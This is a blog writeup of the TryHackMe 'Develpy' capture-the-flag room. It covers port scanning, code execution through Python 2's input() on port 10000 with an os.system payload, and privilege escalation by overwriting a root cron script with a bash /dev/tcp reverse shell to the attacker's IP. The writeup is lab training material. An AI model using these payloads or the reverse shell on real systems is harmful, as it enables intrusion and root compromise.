---
layout: post
title: Develpy
date: 2020-09-10 00:00:01 +5:30
categories: [TryHackMe, Medium]
tags: [python, ctf, cron] # add tag
image: /assets/img/develpy/develpy.png
---

## Description

The Following Post is writeup of Develpy room of tryhackme <https://tryhackme.com/room/bsidesgtdevelpy>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | [stuxnet](https://tryhackme.com/p/stuxnet)

## Summary

The room have 2 ports open 22 and 10000. 10000 port have python running in it and the input() function have an issue which leads to code execution. Get reverse shell as user now there is cronjob running we have rights to edit the file since it is in our home dir. Changing it leads to root.

## Walkthrough

```bash
argenestel@parrot  ~/Desktop/tryhackme/develpyy  rustscan 10.10.252.89
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
--------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.252.89:22
Open 10.10.252.89:10000
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,10000 10.10.252.89

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 16:59 IST
Initiating Ping Scan at 16:59
Scanning 10.10.252.89 [2 ports]
Completed Ping Scan at 16:59, 0.36s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:59
Completed Parallel DNS resolution of 1 host. at 16:59, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:59
Scanning 10.10.252.89 [2 ports]
Discovered open port 10000/tcp on 10.10.252.89
Discovered open port 22/tcp on 10.10.252.89
Completed Connect Scan at 16:59, 0.27s elapsed (2 total ports)
Nmap scan report for 10.10.252.89
Host is up, received conn-refused (0.34s latency).
Scanned at 2020-10-02 16:59:20 IST for 1s

PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack
10000/tcp open  snet-sensor-mgmt syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
argenestel@parrot  ~/Desktop/tryhackme/develpyy  nmap -sC -sV -p22,10000 nmap/develpy - 10.10.252.89
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 16:59 IST
Unable to split netmask from target expression: "nmap/develpy"
Failed to resolve "-".

✘ argenestel@parrot  ~/Desktop/tryhackme/develpyy  nmap -sC -sV -p22,10000 nmap/develpy -v 10.10.252.89
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 16:59 IST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:59
Completed NSE at 16:59, 0.00s elapsed
Initiating NSE at 16:59
Completed NSE at 16:59, 0.00s elapsed
Initiating NSE at 16:59
Completed NSE at 16:59, 0.00s elapsed
Unable to split netmask from target expression: "nmap/develpy"
Initiating Ping Scan at 16:59
Scanning 10.10.252.89 [2 ports]
Completed Ping Scan at 16:59, 0.62s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:59
Completed Parallel DNS resolution of 1 host. at 16:59, 0.04s elapsed
Initiating Connect Scan at 16:59
Scanning 10.10.252.89 [2 ports]
Discovered open port 10000/tcp on 10.10.252.89
Discovered open port 22/tcp on 10.10.252.89
Completed Connect Scan at 16:59, 0.28s elapsed (2 total ports)
Initiating Service scan at 16:59
Scanning 2 services on 10.10.252.89
Completed Service scan at 17:01, 123.23s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.252.89.
Initiating NSE at 17:01
Completed NSE at 17:02, 11.72s elapsed
Initiating NSE at 17:02
Completed NSE at 17:02, 6.87s elapsed
Initiating NSE at 17:02
Completed NSE at 17:02, 0.00s elapsed
Nmap scan report for 10.10.252.89
Host is up (0.54s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings:
|   GenericLines:
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest:
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest:
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL:
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.80%I=7%D=10/2%Time=5F770F36%P=x86_64-pc-linux-gnu%r(N
SF:ULL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20")%
SF:r(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\
SF:r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?
SF:\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File
SF:\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20
SF:\x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x2
SF:0of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<strin
SF:g>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'\x2
SF:0is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20o
SF:f\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20ca
SF:ll\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20i
SF:n\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20
SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\
SF:)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nN
SF:ameError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPRequ
SF:est,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x
SF:20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20Tr
SF:aceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"\./
SF:exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20num_e
SF:xploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x20ex
SF:ploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\x20
SF:line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\x
SF:20not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x2
SF:0exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\x
SF:20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x2
SF:0<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20Plea
SF:se\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\
SF:n\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20
SF:\x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:02
Completed NSE at 17:02, 0.00s elapsed
Initiating NSE at 17:02
Completed NSE at 17:02, 0.00s elapsed
Initiating NSE at 17:02
Completed NSE at 17:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.34 seconds

```

## Port 10000

```bash
argenestel@parrot  ~/Desktop/tryhackme/develpyy  nc 10.10.252.89 10000

        Private 0days

 Please enther number of exploits to send??: a
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```
so our input is converted into int

so i searched what can we do with that.

https://medium.com/@GallegoDor/python-exploitation-1-input-ac10d3f4491f

Okay we can exploit it by Sending system input.

```bash
 ✘ argenestel@parrot  ~/Desktop/tryhackme/develpyy  nc 10.10.252.89 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('bash')
bash: cannot set terminal process group (752): Inappropriate ioctl for device
bash: no job control in this shell
king@ubuntu:~$



OKay got shell as king

(remote) king@ubuntu:/home/king$
[18:59:42] local terminal restored                                                                                      victim.py:790
(local) pwncat$ download credentials.png .
credentials.png ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 265.7/265.7 KB • ? • 0:00:00
[19:00:05] downloaded 265.74KiB in 5.12 seconds                                                                        download.py:79
(local) pwncat$
```

```bash
total 324
drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      6 Oct  2 06:51 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
(remote) king@ubuntu:/home/king$ cat root.sh
python /root/company/media/*.py
(remote) king@ubuntu:/home/king$ cat run.sh
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid
(remote) king@ubuntu:/home
```
okay as we can see .pid is regularly updating  root.sh and run.sh may be in cron job

```bash
(remote) king@ubuntu:/home/king$ echo "bash -i >& /dev/tcp/10.8.108.114/8081 0>&1" > root.sh
(remote) king@ubuntu:/home/king$ cat root.sh
bash -i >& /dev/tcp/10.8.108.114/8081 0>&1

argenestel@parrot  ~/Desktop/tryhackme/develpyy   master  pwncat --listen --port 8081
[19:28:31] received connection from 10.10.252.89:51772                                                                 connect.py:148
[19:28:34] new host w/ hash 5a1b276179c0c4a1feb0f7d665a3af14                                                            victim.py:325
[19:28:48] pwncat running in /bin/bash                                                                                  victim.py:358
[19:28:57] pwncat is ready 🐈                                                                                           victim.py:768

(remote) root@ubuntu:/$
```
Okay got root.
